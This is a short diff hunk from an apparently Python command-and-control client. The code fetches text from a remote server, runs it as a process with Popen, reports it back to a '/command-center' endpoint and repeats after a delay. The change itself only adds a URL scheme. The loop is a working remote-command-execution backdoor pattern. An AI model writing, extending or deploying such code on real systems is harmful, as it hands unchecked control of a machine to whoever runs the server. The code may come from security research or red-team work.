@@ -14,7 +14,7 @@ def main() -> None:
         if get_commands_response.status_code != 204:
             Popen(get_commands_response.text)
             post(
-                f"{IP}:{PORT}/command-center",
+                f"{SCHEME}://{IP}:{PORT}/command-center",
                 data={"command": get_commands_response.text},
             )
         sleep(DELAY)
